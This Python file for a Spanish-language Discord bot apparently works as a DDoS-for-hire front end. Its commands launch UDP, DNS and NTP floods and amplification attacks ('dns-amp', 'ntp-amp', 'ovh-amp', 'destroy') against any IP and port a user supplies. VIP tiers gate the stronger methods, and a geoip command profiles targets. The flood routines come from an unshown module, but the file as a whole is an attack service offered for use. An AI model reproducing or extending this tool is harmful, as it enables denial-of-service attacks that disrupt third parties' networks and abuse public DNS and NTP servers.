import discord
from discord.ext import commands
import requests
import os
import time

from config import OWNER_ID, IMAGE_URLS
from users import is_vip, add_vip_user, remove_vip_user, list_users
from methods import start_attack, stop_attack
from embeds import make_embed

TOKEN_FILE = "token.txt"

# Leer token o pedirlo
if not os.path.exists(TOKEN_FILE):
    token = input("🔑 Ingresa el token de tu bot de Discord: ")
    with open(TOKEN_FILE, "w") as f:
        f.write(token)
else:
    with open(TOKEN_FILE, "r") as f:
        token = f.read().strip()

# Intents
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot conectado como {bot.user.name}")

@bot.command(name='ayuda')
async def ayuda_cmd(ctx):
    embed = make_embed(
        "📚 Ayuda de comandos",
        """```css
!ayuda            → Muestra los cmds
!methods          → Lista los métodos disponibles
!users            → Muestra usuarios VIP y Free
!adduser <id>     → VIPs
!defuser <id>     → VIPs
!stop             → Detiene todos los ataques
!info             → Info bot
!geoip            → Info IP
```""",
        IMAGE_URLS["help"]
    )
    await ctx.send(embed=embed)

@bot.command(name='methods')
async def methods_cmd(ctx):
    embed = make_embed(
        "⚙️ Methods",
        """```css
FREE:
- udppps <ip> <port> <time> <threads>
- udpdown <ip> <port> <time>
- udpflood <ip> <port> <time>
- destroy <ip> <port> <time>

VIP:

- dnsflood <ip> <port> <time>
- ntpflood <ip> <port> <time>

VIP AMP's:
- dns-amp <ip> <port> <time>
- ntp-amp <ip> <port> <time>
- mix-amp <ip> <port> <time>
- ovh-amp <ip> <port> <time>
```""",
        IMAGE_URLS["methods"]
    )
    await ctx.send(embed=embed)

@bot.command(name='users')
async def users_cmd(ctx):
    free_users, vip_users = list_users()
    embed = make_embed(
        "👥 Usuarios",
        f"""```diff
- Free:
{chr(10).join(free_users) or "Ninguno"}

+ VIP:
{chr(10).join(vip_users) or "Ninguno"}
```""",
        IMAGE_URLS["users"]
    )
    await ctx.send(embed=embed)

@bot.command(name='adduser')
async def adduser_cmd(ctx, user_id: str):
    if str(ctx.author.id) != OWNER_ID:
        return await ctx.send("⛔ Solo el creador puede usar este comando")
    add_vip_user(user_id)
    await ctx.send(f"✅ Usuario `{user_id}` agregado como VIP")

@bot.command(name='defuser')
async def defuser_cmd(ctx, user_id: str):
    if str(ctx.author.id) != OWNER_ID:
        return await ctx.send("⛔ Solo el creador puede usar este comando")
    remove_vip_user(user_id)
    await ctx.send(f"✅ Usuario `{user_id}` eliminado de VIP")

@bot.command(name='stop')
async def stop_cmd(ctx):
    stop_attack()
    await ctx.send("🛑 Todos los ataques han sido detenidos")

@bot.command(name='info')
async def info_cmd(ctx):
    embed = make_embed(
        "🤖 Info del bot",
        f"Bot creado por <@{OWNER_ID}>.\nVersión: 1.0\nPython",
        IMAGE_URLS["info"]
    )
    await ctx.send(embed=embed)

# ===== MÉTODOS DE ATAQUE (VIP & FREE) =====

def create_attack_callback(ctx, title):
    async def callback():
        embed = make_embed(
            f"✅ {title} finalizado",
            "El ataque ha terminado",
            IMAGE_URLS["attack"] if "AMP" not in title else IMAGE_URLS["amp"]
        )
        await ctx.send(embed=embed)
    return callback

# --- VIP ---

@bot.command(name='dnsflood')
async def dnsflood_cmd(ctx, ip: str, port: int, duration: int):
    if not is_vip(ctx.author.id):
        return await ctx.send("🚫 Este método es solo para usuarios VIP")
    result = start_attack("dns", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "DNS Flood")()))
    if result:
        return await ctx.send(result)
    embed = make_embed("🚀 DNS Flood iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["attack"])
    await ctx.send(embed=embed)

@bot.command(name='ntpflood')
async def ntpflood_cmd(ctx, ip: str, port: int, duration: int):
    if not is_vip(ctx.author.id):
        return await ctx.send("🚫 Este método es solo para usuarios VIP")
    result = start_attack("ntp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "NTP Flood")()))
    if result:
        return await ctx.send(result)
    embed = make_embed("🚀 NTP Flood iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["attack"])
    await ctx.send(embed=embed)

@bot.command(name='dns-amp')
async def dns_amp_cmd(ctx, ip: str, port: int, duration: int):
    if not is_vip(ctx.author.id):
        return await ctx.send("🚫 Este método es solo para usuarios VIP")
    result = start_attack("dns-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "DNS-AMP")()))
    if result:
        return await ctx.send(result)
    embed = make_embed("💥 DNS-AMP iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["amp"])
    await ctx.send(embed=embed)

@bot.command(name='ntp-amp')
async def ntp_amp_cmd(ctx, ip: str, port: int, duration: int):
    if not is_vip(ctx.author.id):
        return await ctx.send("🚫 Este método es solo para usuarios VIP")
    result = start_attack("ntp-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "NTP-AMP")()))
    if result:
        return await ctx.send(result)
    embed = make_embed("💥 NTP-AMP iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["amp"])
    await ctx.send(embed=embed)

@bot.command(name='mix-amp')
async def mix_amp_cmd(ctx, ip: str, port: int, duration: int):
    if not is_vip(ctx.author.id):
        return await ctx.send("🚫 Este método es solo para usuarios VIP")
    result = start_attack("mix-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "MIX-AMP")()))
    if result:
        return await ctx.send(result)
    embed = make_embed("💥 MIX-AMP iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["amp"])
    await ctx.send(embed=embed)

@bot.command(name='ovh-amp')
async def ovh_amp_cmd(ctx, ip: str, port: int, duration: int):
    if not is_vip(ctx.author.id):
        return await ctx.send("🚫 Este método es solo para usuarios VIP")
    result = start_attack("ovh-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "OVH-AMP")()))
    if result:
        return await ctx.send(result)
    embed = make_embed("💥 OVH-AMP iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["amp"])
    await ctx.send(embed=embed)

# --- FREE ---

@bot.command(name='udppps')
async def udppps_cmd(ctx, ip: str, port: int, duration: int):
    from config import IMAGE_URLS

    async def notify_end():
        embed = make_embed("✅ UDPPPS terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
        await ctx.send(embed=embed)

    result = start_attack("udppps", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
    if result:
        return await ctx.send(result)
    embed = make_embed("💣 UDPPPS iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["free"])
    await ctx.send(embed=embed)

@bot.command(name='udpdown')
async def udpdown_cmd(ctx, ip: str, port: int, duration: int):
    async def notify_end():
        embed = make_embed("✅ UDPDown terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
        await ctx.send(embed=embed)

    result = start_attack("udpdown", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
    if result:
        return await ctx.send(result)
    embed = make_embed("💣 UDPDown iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["free"])
    await ctx.send(embed=embed)

@bot.command(name='udpflood')
async def udpflood_cmd(ctx, ip: str, port: int, duration: int):
    async def notify_end():
        embed = make_embed("✅ UDPFlood terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
        await ctx.send(embed=embed)

    result = start_attack("udpflood", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
    if result:
        return await ctx.send(result)
    embed = make_embed("💥 UDPFlood iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["free"])
    await ctx.send(embed=embed)

@bot.command(name='destroy')
async def destroy_cmd(ctx, ip: str, port: int, duration: int):
    async def notify_end():
        embed = make_embed("✅ Attack Destroy terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
        await ctx.send(embed=embed)

    start_attack("destroy", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
    embed = make_embed("💣  Attack Destroy iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["free"])
    await ctx.send(embed=embed)

@bot.command(name='geoip')
async def geoip_cmd(ctx, ip: str):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}").json()

        if response["status"] != "success":
            await ctx.send("No se pudo obtener información de esa IP")
            return

        embed = discord.Embed(
            title="🌍 Información de la IP",
            description=f"""```yaml
IP:        {response['query']}
País:      {response['country']} ({response['countryCode']})
Ciudad:    {response['city']}
Región:    {response['regionName']}
ISP:       {response['isp']}
Org:       {response['org']}
ASN:       {response['as']}
Lat/Lon:   {response['lat']}, {response['lon']}
Zona:      {response['timezone']}
```""",
            color=discord.Color.green()
        )
        embed.set_footer(text="Bot hecho por zJonch")
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Error al consultar la IP: `{str(e)}`")
    
# Ejecutar el bot
bot.run(token)
